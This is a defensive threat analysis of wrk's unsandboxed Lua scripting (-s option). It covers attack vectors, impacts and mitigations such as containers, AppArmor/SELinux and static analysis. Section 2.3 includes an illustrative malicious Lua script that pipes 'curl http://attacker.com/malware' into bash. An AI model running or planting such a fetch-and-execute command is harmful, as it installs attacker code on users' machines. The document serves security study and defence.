# Deep Analysis of Malicious Lua Script Execution in `wrk`

## 1. Objective, Scope, and Methodology

### 1.1. Objective

The objective of this deep analysis is to thoroughly examine the "Malicious Lua Script Execution" attack surface in the context of `wrk`, a widely used HTTP benchmarking tool.  We aim to understand the precise mechanisms by which this attack can be carried out, the potential consequences, and the effectiveness of proposed mitigation strategies.  This analysis will inform best practices for secure `wrk` usage and guide developers in minimizing the risk associated with this attack vector.

### 1.2. Scope

This analysis focuses specifically on the `-s` option of `wrk`, which allows the execution of Lua scripts.  We will consider:

*   **Lua Script Functionality:**  How `wrk` integrates with Lua, the capabilities exposed to Lua scripts, and the limitations (if any) imposed by `wrk` itself.
*   **Attack Vectors:**  The various ways an attacker might deliver a malicious Lua script to a user running `wrk`.
*   **Impact Analysis:**  A detailed breakdown of the potential consequences of successful exploitation, including specific examples of malicious actions.
*   **Mitigation Effectiveness:**  An evaluation of the proposed mitigation strategies, identifying any weaknesses or limitations.
*   **Alternative Mitigations:** Exploration of additional mitigation techniques beyond those initially listed.

This analysis *does not* cover other potential attack surfaces of `wrk` (e.g., vulnerabilities in the HTTP parsing logic) unless they directly relate to the Lua scripting functionality.

### 1.3. Methodology

This analysis will employ the following methods:

*   **Code Review:** Examination of the relevant `wrk` source code (available on GitHub) to understand how Lua scripting is implemented and how scripts interact with the `wrk` environment.
*   **Experimentation:**  Creation and execution of both benign and malicious Lua scripts to observe their behavior and impact on the system.  This will be performed in a controlled, isolated environment.
*   **Literature Review:**  Consultation of relevant documentation for `wrk`, Lua, and security best practices.
*   **Threat Modeling:**  Identification of potential attack scenarios and the steps an attacker might take to exploit this vulnerability.
*   **Vulnerability Analysis:**  Assessment of the inherent risks associated with executing arbitrary code and how they manifest in the context of `wrk`.

## 2. Deep Analysis of the Attack Surface

### 2.1. Lua Script Functionality within `wrk`

`wrk` leverages the LuaJIT interpreter to execute Lua scripts provided via the `-s` option.  The Lua environment within `wrk` provides access to several key functions and objects, allowing scripts to:

*   **Modify Requests:**  Alter HTTP headers, body content, and request methods before sending requests to the target server.  This is the primary intended use case.
*   **Process Responses:**  Analyze response headers and bodies, extract data, and perform calculations.
*   **Control `wrk` Behavior:**  Influence the duration of the test, the number of connections, and other parameters (though with some limitations).
*   **Interact with the System (Limited):**  Crucially, LuaJIT, and therefore `wrk`'s Lua environment, *does not inherently sandbox* the Lua code.  This means Lua scripts have access to the same system resources as the `wrk` process itself.  This includes:
    *   **File System Access:**  Reading, writing, and deleting files.
    *   **Network Access:**  Creating network connections (beyond those managed by `wrk`).
    *   **Process Execution:**  Launching other processes on the system.
    *   **Environment Variable Access:** Reading and potentially modifying environment variables.

The `wrk` source code does not implement any specific restrictions on the Lua environment beyond what is provided by LuaJIT itself.  This is the core of the vulnerability.

### 2.2. Attack Vectors

An attacker can deliver a malicious Lua script through various means:

*   **Social Engineering:**  Tricking a user into downloading and running a script from an untrusted source (e.g., a phishing email, a malicious website, a compromised software repository).
*   **Supply Chain Attack:**  Compromising a legitimate software distribution channel to inject a malicious script into a seemingly benign package.
*   **Man-in-the-Middle (MITM) Attack:**  Intercepting a legitimate script download and replacing it with a malicious one (less likely, but possible if the script is downloaded over HTTP).
*   **Compromised Development Environment:** If an attacker gains access to a developer's machine, they could inject malicious code into a script that is later used with `wrk`.

### 2.3. Impact Analysis

The impact of a successful malicious Lua script execution is severe and can include:

*   **Data Exfiltration:**  The script can read sensitive files (e.g., configuration files, SSH keys, database credentials) and send them to an attacker-controlled server.
*   **Malware Installation:**  The script can download and execute arbitrary malware, including ransomware, keyloggers, or backdoors.
*   **System Modification:**  The script can alter system configurations, disable security software, or create new user accounts.
*   **Lateral Movement:**  The script can use the compromised machine as a launching point to attack other systems on the network.
*   **Denial of Service (DoS):** While `wrk` is a benchmarking tool, a malicious script could be used to launch a DoS attack against a target, although this is not the primary concern.
* **Cryptocurrency Mining:** The script could install and run cryptocurrency mining software, consuming system resources.
* **Data Destruction:** The script could delete or encrypt files on the system.

**Example Malicious Script (Illustrative):**

```lua
-- malicious.lua
local handle = io.popen("curl -s http://attacker.com/malware | bash")
handle:close()
```

This simple script uses `io.popen` (available in the standard Lua library) to download and execute a shell script from an attacker-controlled server.  This shell script could then perform any of the malicious actions listed above.

### 2.4. Mitigation Effectiveness

Let's analyze the effectiveness of the initially proposed mitigation strategies:

*   **Never Run Untrusted Scripts:** This is the *most effective* mitigation.  If followed strictly, it eliminates the risk entirely.  However, it relies on user vigilance and the ability to accurately identify trusted sources.
*   **Code Review:**  Thorough code review is crucial, but it's not foolproof.  Complex or obfuscated malicious code can be difficult to detect, even for experienced reviewers.  Furthermore, it requires expertise in Lua and security.
*   **Sandboxing (Container, VM):**  This is a *highly effective* mitigation.  By running `wrk` in a container or VM, the impact of a compromised script is limited to the isolated environment.  However, there might be a slight performance overhead, and the sandbox itself needs to be properly configured and secured.  Escaping a well-configured container or VM is significantly more difficult than escaping the `wrk` process.
*   **Principle of Least Privilege:**  Running `wrk` as a non-privileged user is a good security practice, but it's *not a complete solution*.  A malicious script running as a non-privileged user can still access and potentially damage user-owned files and data.  It reduces the impact, but doesn't eliminate it.

### 2.5. Alternative Mitigations

Beyond the initial suggestions, consider these additional mitigation strategies:

*   **Lua Sandboxing Libraries:** Explore using Lua sandboxing libraries *within* the Lua script itself.  These libraries (e.g., `luasandbox`) can restrict the capabilities of the Lua environment, limiting access to system resources.  However, these libraries might have their own vulnerabilities or limitations, and they add complexity to the script.  They also require modification of the `wrk` source code to integrate properly.
*   **Static Analysis Tools:**  Employ static analysis tools designed for Lua to automatically scan scripts for potentially malicious patterns or code.  This can help identify suspicious code before execution.
*   **AppArmor/SELinux:**  Use mandatory access control (MAC) systems like AppArmor (Ubuntu) or SELinux (Red Hat/CentOS) to confine the `wrk` process and limit its access to system resources.  This provides a system-level layer of defense, even if the Lua script attempts to perform malicious actions.  This requires careful configuration to avoid breaking `wrk`'s legitimate functionality.
*   **Network Monitoring:**  Monitor network traffic generated by `wrk` to detect any suspicious connections or data exfiltration attempts.  This can help identify a compromised script in action.
* **Disable Lua Scripting:** If Lua scripting is not required for a particular use case, consider modifying the `wrk` source code to completely disable the `-s` option. This eliminates the attack surface entirely. This is the most drastic, but also the most secure option if scripting is not needed.

## 3. Conclusion

The "Malicious Lua Script Execution" attack surface in `wrk` presents a significant security risk due to the unrestricted access Lua scripts have to the system running `wrk`.  The most effective mitigation strategies are to never run untrusted scripts and to run `wrk` within a sandboxed environment.  Code review, the principle of least privilege, and additional techniques like Lua sandboxing libraries, static analysis, and MAC systems can provide further layers of defense.  Ultimately, a combination of these strategies, tailored to the specific use case and risk tolerance, is recommended to minimize the risk of this attack. Developers using `wrk` should be acutely aware of this vulnerability and prioritize secure usage practices.
